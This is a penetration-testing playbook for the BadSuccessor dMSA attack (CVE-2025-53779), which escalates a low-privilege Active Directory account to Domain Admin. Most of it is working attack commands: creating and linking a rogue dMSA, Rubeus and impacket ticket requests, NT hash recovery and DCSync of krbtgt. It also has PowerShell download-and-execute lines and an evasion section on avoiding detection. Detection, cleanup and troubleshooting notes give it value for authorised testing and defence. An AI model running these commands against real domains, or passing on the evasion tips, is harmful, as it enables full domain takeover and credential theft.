---
tags:
  - hack-notes
  - playbook
  - ad
---

# badSuccessor dMSA to Domain Admin Playbook

> From a low-priv account with write rights over any OU, create a delegated Managed Service Account (dMSA), fake-migrate a Domain Admin into it, and inherit that DA's keys and privileges via Kerberos.

> **Attack graph position**
> **Fed by:** One low-priv domain credential with OU write rights (entry); any foothold that yields a domain credential.
> **Feeds into:** [DCSync to Golden Ticket Persistence](DCSync%20to%20Golden%20Ticket%20Persistence.md)
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance

| | |
|---|---|
| Goal | Escalate from a low-priv domain account to Domain Admin / Tier-0 |
| Starting position | Authenticated low-priv domain user with `CreateChild` (or `GenericAll`/`GenericWrite`/write-property) over at least one OU or container |
| End state | Domain Admin: full PAC of the target plus the target's RC4/AES keys (NT hash), DCSync-equivalent |
| Key techniques | T1078 Valid Accounts, T1098 Account Manipulation, T1134 Access Token Manipulation, T1550.003 Pass the Ticket, abuse of CVE-2025-53779 (BadSuccessor) |
| Prerequisites | At least one Windows **Server 2025** DC in the domain (dMSA schema present); KDS root key exists; you hold write/create rights over an OU; pre-August-2025 patch level for the one-sided variant |
| Difficulty | Low to Medium (no exploit dev, no creds over the target needed pre-patch) |
| Noise level | Quiet to Moderate (looks like service-account admin unless dMSA SACL auditing is on) |

The crux: the KDC trusts a single attribute, `msDS-ManagedAccountPrecededByLink`, to decide which account a dMSA "succeeds." When a dMSA authenticates, the KDC builds the PAC from the linked account's SIDs and ships the linked account's Kerberos keys back inside a `KERB-DMSA-KEY-PACKAGE`. You never need any right over the target; only write rights over the dMSA you create.

## Attack Path

```
low-priv user
  |
  | 1. enum: find OU where I have CreateChild / write rights
  v
[ writable OU found? ] -- no --> pivot: ADCS ESC chains / RBCD / shadow-creds (other playbooks)
  | yes
  v
[ Server 2025 DC present? ] -- no --> dMSA schema absent, technique UNAVAILABLE --> pivot
  | yes
  v
2. create dMSA object in the writable OU (msDS-DelegatedManagedServiceAccount)
  |
  v
3. fake-migrate: set msDS-ManagedAccountPrecededByLink = <DA DN>
                 set msDS-DelegatedMSAState = 2 (migration complete)
                 set msDS-GroupMSAMembership = me (so I can read the managed password)
  |
  | [ patched (Aug 2025+)? ]
  | -- yes --> one-sided link rejected; need control of BOTH ends -> Variations (Ouroboros / two-way)
  | -- no  --> continue
  v
4. Rubeus tgtdeleg  (get my own TGT)
  |
  v
5. Rubeus asktgs /dmsa  -> dMSA TGT with KERB-DMSA-KEY-PACKAGE
       current-keys = dMSA keys ; previous-keys = TARGET's RC4-HMAC (NT hash)
  |
  v
6. authenticate as the inherited identity (PtT) OR secretsdump with the dMSA TGT
  v
DOMAIN ADMIN
```

## Prerequisites and Setup

- At least one **Windows Server 2025** DC. dMSA is a Server 2025 feature; if no DC runs the 2025 schema, the `msDS-DelegatedManagedServiceAccount` object class does not exist and the whole chain is dead. Check first.
- A **KDS root key** in the domain (the same prerequisite as gMSA). Without it the dMSA has no managed password and ticket requests fail. Server 2025 normally has one; if absent the DA can create one but a low-priv attacker cannot.
- A low-priv principal with **`CreateChild` for `msDS-DelegatedManagedServiceAccount`** (or `GenericAll`/`GenericWrite`/`WriteDACL`) over an OU or container. Delegated IT, `Account Operators`, helpdesk OUs, and "self-service" OUs are the common holes.
- Patch posture matters. Pre August 2025 Patch Tuesday: the one-sided link below works straight to DA. Post patch (kdcsvc.dll hardened for CVE-2025-53779): the KDC requires a **mutual** pairing, so the one-shot DA path is gone; see Variations for the post-patch credential-theft route.
- Tooling, pick one creation path and one auth path:
  - `bloodyAD` (cross-platform, no Windows host needed) to create + link the dMSA.
  - `SharpSuccessor.exe` (logangoins) on a Windows foothold to create + link in one call.
  - `BadSuccessor.ps1` (LuemmelSec collection) PowerShell wrapper, has `check` and `exploit` modes.
  - `NetExec` `ldap -M badsuccessor` to find vulnerable OUs and to run the attack from Linux.
  - `Rubeus` (`/dmsa` aware build) for the ticket flow, or `impacket` `getTGT.py --dmsa` then `secretsdump.py`.
  - Akamai's `Get-BadSuccessorOUPermissions.ps1` to enumerate writable OUs.

## Walkthrough

### Step 1. Enumerate OUs where you can create objects

What and why: the only real precondition is write/create over some OU. Map it before touching anything. Start broad, then confirm the create right specifically for the dMSA object class.

Akamai's purpose-built enumerator (run as the low-priv user):

```powershell
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/akamai/BadSuccessor/main/Get-BadSuccessorOUPermissions.ps1")
Get-BadSuccessorOUPermissions
```

From Linux, NetExec confirms exploitability and lists the OUs in one pass:

```bash
nxc ldap DC01.corp.local -u lowpriv -p 'Passw0rd!' -d corp.local \
    --dns-server 10.10.10.10 -M badsuccessor
```

bloodyAD writable-object sweep (shows exactly what your principal can write):

```bash
bloodyAD --host DC01.corp.local -d corp.local -u lowpriv -p 'Passw0rd!' \
    get writable --detail
```

Success signal: at least one OU/container returned with `CreateChild` (ideally for `msDS-DelegatedManagedServiceAccount`) or `GenericAll`/`GenericWrite`/`WriteDACL`. Note its full DN, for example `OU=Servers,DC=corp,DC=local`.

Decision / branch: no writable OU returned and no `WriteDACL` anywhere you can leverage, this chain does not apply. Pivot to [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md) for ADCS ESC1-ESC8, RBCD, or shadow-credentials routes.

### Step 2. Confirm a Server 2025 DC and a KDS root key

What and why: dMSA only exists on the Server 2025 schema. No 2025 DC means no `msDS-DelegatedManagedServiceAccount` class and nothing to abuse. Confirm before you generate object-creation telemetry for nothing.

```bash
# DC OS versions
nxc smb 10.10.10.0/24 -u lowpriv -p 'Passw0rd!' -d corp.local | grep -i 'Domain Controller'
```

```powershell
# From a domain-joined host: any 2025 DC?
Get-ADDomainController -Filter * | Select-Object Name, OperatingSystem

# Schema present? this class only exists on the 2025 schema
Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext `
    -LDAPFilter "(lDAPDisplayName=msDS-DelegatedManagedServiceAccount)"
```

Success signal: at least one DC reports `Windows Server 2025` and the schema query returns the class object.

Decision / branch: **no Server 2025 DC -> the dMSA object class is absent -> technique UNAVAILABLE.** Do not proceed. Pivot to other Tier-0 routes (ADCS, RBCD, DCSync via other ACL abuse) in [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md) and [Active Directory and Kerberos](../Cheatsheets/Active%20Directory%20and%20Kerberos.md).

### Step 3. Create the rogue dMSA in the writable OU

What and why: drop an `msDS-DelegatedManagedServiceAccount` object into the OU you control. This is the object whose attributes you will weaponize. By itself it is inert.

bloodyAD (one command creates the dMSA):

```bash
bloodyAD --host DC01.corp.local -d corp.local -u lowpriv -p 'Passw0rd!' \
    add dmsa "OU=Servers,DC=corp,DC=local" attacker_dmsa
```

PowerShell on a Windows foothold (RSAT):

```powershell
New-ADServiceAccount -Name attacker_dmsa `
    -DNSHostName attacker_dmsa.corp.local `
    -KerberosEncryptionType AES128,AES256 `
    -Path "OU=Servers,DC=corp,DC=local" `
    -CreateDelegatedServiceAccount   # creates a dMSA, not a gMSA
```

Success signal: the object `CN=attacker_dmsa,OU=Servers,DC=corp,DC=local` exists with `objectClass: msDS-DelegatedManagedServiceAccount`. The DC logs Event 5137 (object creation).

### Step 4. Fake the migration: link the target and flip the state

What and why: this is the actual exploit. Two attributes do the work. `msDS-ManagedAccountPrecededByLink` set to the target's DN tells the KDC "this dMSA succeeds that account." `msDS-DelegatedMSAState` set to `2` means "migration complete," so the KDC treats the dMSA as the live successor. You also set `msDS-GroupMSAMembership` (the `PrincipalsAllowedToRetrieveManagedPassword` equivalent) to your own principal so you can pull the managed password. You need no rights over the target itself.

bloodyAD, attribute by attribute (target = the Administrator / a DA):

```bash
# 1) point the successor link at the Domain Admin you want to inherit
bloodyAD --host DC01.corp.local -d corp.local -u lowpriv -p 'Passw0rd!' \
    set object "CN=attacker_dmsa,OU=Servers,DC=corp,DC=local" \
    msDS-ManagedAccountPrecededByLink \
    -v "CN=Administrator,CN=Users,DC=corp,DC=local"

# 2) mark migration as complete (state 2)
bloodyAD --host DC01.corp.local -d corp.local -u lowpriv -p 'Passw0rd!' \
    set object "CN=attacker_dmsa,OU=Servers,DC=corp,DC=local" \
    msDS-DelegatedMSAState -v 2

# 3) allow my own principal to retrieve the dMSA managed password
bloodyAD --host DC01.corp.local -d corp.local -u lowpriv -p 'Passw0rd!' \
    add dmsa-membership "CN=attacker_dmsa,OU=Servers,DC=corp,DC=local" lowpriv
```

SharpSuccessor does steps 3 and 4 together in one call (Windows foothold):

```powershell
# /account = your current low-priv user, /name = the dMSA to create, /impersonate = the target
.\SharpSuccessor.exe add /impersonate:Administrator `
    /path:"OU=Servers,DC=corp,DC=local" `
    /account:lowpriv /name:attacker_dmsa
```

BadSuccessor.ps1 wrapper (check then exploit):

```powershell
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/LuemmelSec/Pentest-Tools-Collection/main/tools/ActiveDirectory/BadSuccessor.ps1")
BadSuccessor -mode check   -Domain corp.local
BadSuccessor -mode exploit -Path "OU=Servers,DC=corp,DC=local" `
    -Name attacker_dmsa -DelegateAdmin lowpriv -DelegateTarget Administrator -Domain corp.local
```

Success signal: reading the dMSA back shows `msDS-ManagedAccountPrecededByLink = CN=Administrator,...` and `msDS-DelegatedMSAState = 2`. Each write fires Event 5136 on the DC.

Decision / branch: if the DC **rejects** the `msDS-ManagedAccountPrecededByLink` write or later refuses the ticket with a successor/validation error, the domain is **patched** (CVE-2025-53779, August 2025+). The one-sided link is dead. Go to Variations for the post-patch mutual-pairing / Ouroboros credential-theft route, which still extracts the target's keys but needs you to control both link ends.

### Step 5. Get your own TGT (delegation ticket)

What and why: the dMSA ticket request is made on behalf of an authenticated principal. Grab a usable TGT for the low-priv user first. `tgtdeleg` extracts one without needing the user's plaintext.

Rubeus on the Windows foothold:

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

impacket equivalent from Linux (just authenticate the low-priv user to get a ccache):

```bash
getTGT.py corp.local/lowpriv:'Passw0rd!' -dc-ip 10.10.10.10
export KRB5CCNAME=lowpriv.ccache
```

Success signal: a base64 TGT blob (Rubeus) or a `lowpriv.ccache` on disk.

### Step 6. Request the dMSA TGT and harvest the inherited keys

What and why: this is the payoff. Asking for a ticket as the dMSA with the `/dmsa` flag makes the KDC build the PAC from the **linked target's SIDs** and return a `KERB-DMSA-KEY-PACKAGE` containing `current-keys` (the dMSA's own keys) and `previous-keys` (the **target's RC4-HMAC, that is the target's NT hash**). You walk away with both a DA-stamped ticket and the DA's NT hash.

Rubeus (pass the low-priv TGT from step 5 into `/ticket`):

```powershell
.\Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/corp.local `
    /dmsa /opsec /nowrap /ptt /ticket:<BASE64_TGT_FROM_STEP_5>
```

Rubeus prints the `KERB-DMSA-KEY-PACKAGE`. Read `previous-keys`: the RC4-HMAC entry is the target Administrator's NT hash. `/ptt` injects the dMSA TGT into your session.

impacket route from Linux (requests the dMSA TGT, then dumps with it):

```bash
# get the dMSA TGT (impacket getTGT with dMSA support)
getTGT.py -dmsa 'corp.local/attacker_dmsa$' -dc-ip 10.10.10.10 -no-pass
export KRB5CCNAME=attacker_dmsa.ccache
```

Success signal: a `KERB-DMSA-KEY-PACKAGE` with a non-empty `previous-keys` list, and a dMSA TGT whose PAC carries the Domain Admins SID (S-1-5-21-...-512) and the Administrator RID. Event 2946 fires on the DC with Caller SID `S-1-5-7` (anonymous), the dMSA-auth tell.

### Step 7. Authenticate as the inherited Domain Admin

What and why: cash in. The dMSA TGT already carries the DA PAC, so use it directly; or use the recovered NT hash for the cleanest path. Prove DA with a Tier-0 action that is reversible (read, list, DCSync), not destructive.

Pass-the-ticket with the dMSA TGT (already injected by `/ptt` in step 6):

```powershell
dir \\DC01.corp.local\C$
.\Rubeus.exe asktgs /user:attacker_dmsa$ /service:cifs/DC01.corp.local /dmsa /opsec /ptt /ticket:<DMSA_TGT>
```

Or use the recovered Administrator NT hash directly (overpass-the-hash / DCSync):

```bash
# DCSync the krbtgt with the dMSA TGT (Kerberos auth, no password)
export KRB5CCNAME=attacker_dmsa.ccache
secretsdump.py -k -no-pass 'corp.local/attacker_dmsa$@DC01.corp.local' \
    -just-dc-user 'corp\krbtgt' -dc-ip 10.10.10.10

# or pass the recovered Administrator NT hash
nxc smb DC01.corp.local -u Administrator -H <RECOVERED_NT_HASH> -d corp.local
```

Success signal: file listing of `\\DC01\C$`, or `secretsdump` returns the krbtgt hash. You hold Tier-0. Stop at the proven primitive; do not move to destructive actions.

## OPSEC and Detection

This chain is quiet only where dMSA object auditing is off, which is common today. The defender-visible signals:

- **Event 5137 (object created)**: a new `msDS-DelegatedManagedServiceAccount`. Alert when the creator is not a sanctioned service-account provisioner. Requires a SACL on the OU and the "Audit Directory Service Changes" subcategory.
- **Event 5136 (attribute modified)**: writes to `msDS-ManagedAccountPrecededByLink` and `msDS-DelegatedMSAState`. A `msDS-ManagedAccountPrecededByLink` value pointing at a privileged account (Administrator, a Domain Admin, krbtgt) outside a sanctioned migration is the single strongest tell. A 5137 immediately followed by 5136 writes to these attributes is the BadSuccessor pattern.
- **Event 2946 (Directory Service log): dMSA authentication.** Logged when a TGT with a `KERB-DMSA-KEY-PACKAGE` is issued. The **Caller SID `S-1-5-7`** (anonymous) is the high-fidelity indicator of the BadSuccessor ticket flow rather than a legitimate migrated dMSA logon.
- **OU ACL changes**: Event 5136 on `nTSecurityDescriptor` for an OU/container, especially grants of `CreateChild`, `GenericAll`, `GenericWrite`, or `WriteDACL` to non-Tier-0 principals. That ACL grant is the precondition that made this possible.
- **EDR / Kerberos anomalies**: a service account (the dMSA) suddenly authenticating with a Domain Admins SID in its PAC, or a brand-new account performing DCSync.

Operator noise reduction:
- Name the dMSA to blend in with real service accounts (for example `svc_sql_dmsa`), not `attacker_dmsa`.
- Do the LDAP writes off-hours and minimize the 5137-to-5136 window; pre-stage attribute values so it reads like a normal provisioning batch.
- Prefer the recovered NT hash over repeated `/dmsa` ticket requests; each `asktgs /dmsa` regenerates the 2946 with the S-1-5-7 caller SID.
- Avoid linking directly to `krbtgt` or the literal `Administrator` if a quieter privileged target (a less-watched DA or a Tier-0 service account) gets you the same place.

## Cleanup

Revert in reverse order. Leaving the dMSA behind is both a persistence backdoor and a glaring IOC, so remove it unless persistence is explicitly authorized.

```bash
# 1) remove the migration link and reset the state so no successor relationship remains
bloodyAD --host DC01.corp.local -d corp.local -u lowpriv -p 'Passw0rd!' \
    set object "CN=attacker_dmsa,OU=Servers,DC=corp,DC=local" \
    msDS-DelegatedMSAState -v 0
bloodyAD --host DC01.corp.local -d corp.local -u lowpriv -p 'Passw0rd!' \
    remove object "CN=attacker_dmsa,OU=Servers,DC=corp,DC=local" \
    msDS-ManagedAccountPrecededByLink

# 2) delete the dMSA object entirely
bloodyAD --host DC01.corp.local -d corp.local -u lowpriv -p 'Passw0rd!' \
    remove object "CN=attacker_dmsa,OU=Servers,DC=corp,DC=local"
```

PowerShell equivalent:

```powershell
Remove-ADServiceAccount -Identity attacker_dmsa -Confirm:$false
```

- Purge any tickets you injected: `Rubeus.exe purge` (Windows) or delete the `.ccache` files (Linux), and `klist purge`.
- If you recovered the target's NT hash and reported it, recommend a forced reset of that account (the hash you hold remains valid until rotated).
- If you used DCSync against krbtgt, flag that krbtgt may need a double rotation as remediation.
- Note the OU ACL that enabled this for the report; do not modify the production ACL yourself unless asked.

## Troubleshooting

- **`msDS-DelegatedManagedServiceAccount` object class not found / `New-ADServiceAccount -CreateDelegatedServiceAccount` is unknown**: no Server 2025 DC or the schema is older. Confirm with the Step 2 schema query. Technique is unavailable, pivot.
- **dMSA creation succeeds but ticket requests fail with a managed-password / KDS error**: no **KDS root key**. Check with `Get-KdsRootKey`. You usually cannot create one as a low-priv user; this becomes a blocker unless an admin seeds it (and a freshly created key is not usable for 10 hours by default).
- **The `msDS-ManagedAccountPrecededByLink` write is rejected, or the dMSA TGT comes back with no inherited PAC / empty previous-keys**: the domain is **patched** (CVE-2025-53779). The one-sided link no longer yields keys. Switch to the mutual-pairing variant (Variations).
- **`add dmsa` / `set object` returns insufficient access**: your principal lacks the specific `CreateChild` for the dMSA class or write-property on that OU. Re-run the Step 1 writable sweep against a different OU; the right may exist on a sibling container, not the one you tried.
- **Rubeus `asktgs` errors on `/dmsa`**: you are on a build without dMSA support. Use a current Rubeus release (the `/dmsa` flag is required) or fall back to the impacket `getTGT.py -dmsa` route.
- **`PrincipalsAllowedToRetrieveManagedPassword` / `msDS-GroupMSAMembership` not set**: you cannot retrieve the managed password. Add your principal via `add dmsa-membership` (Step 4, item 3) before requesting the ticket.
- **5137/5136 alerts fired immediately**: dMSA SACL auditing is enabled. You are burned for that object; clean up fast (Cleanup section) and reassess whether to continue.

## Variations and Pivots

- **Post-patch mutual pairing (CVE-2025-53779 hardened, "BadSuccessor is dead?")**: the August 2025 patch makes the KDC require a real two-way migration. The one-shot DA jump is gone, but if you control **both** ends of the link you can still pull the target's keys, a DCSync-like credential theft with a different telemetry footprint (2946 instead of DCSync replication events). Useful in an already-compromised domain to harvest specific credentials quietly.
- **dMSA Ouroboros (Huntress)**: self-sustaining credential extraction on Server 2025 where the dMSA is chained to keep yielding keys; relevant when you need durable credential access rather than a single escalation.
- **Pick a quieter target**: instead of `Administrator`, link a less-monitored Domain Admin, an Enterprise Admin in the forest root, or a Tier-0 service account. Same outcome, lower alert profile.
- **Escalate from the DA end state**: from Domain Admin go to DCSync (krbtgt -> Golden Ticket persistence), Tier-0 lateral movement, AD CS CA compromise, or trust abuse into other domains/forests.
- **No writable OU / no Server 2025 DC**: this chain is out. Pivot to ADCS ESC1-ESC8, RBCD via `msDS-AllowedToActOnBehalfOfOtherIdentity`, shadow credentials (`msDS-KeyCredentialLink`), or other ACL-abuse routes in [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md).

## Related

- [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md)
- [Active Directory and Kerberos](../Cheatsheets/Active%20Directory%20and%20Kerberos.md)
- [Assumed Breach](../Checklists/Assumed%20Breach.md)
- Ariadne

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
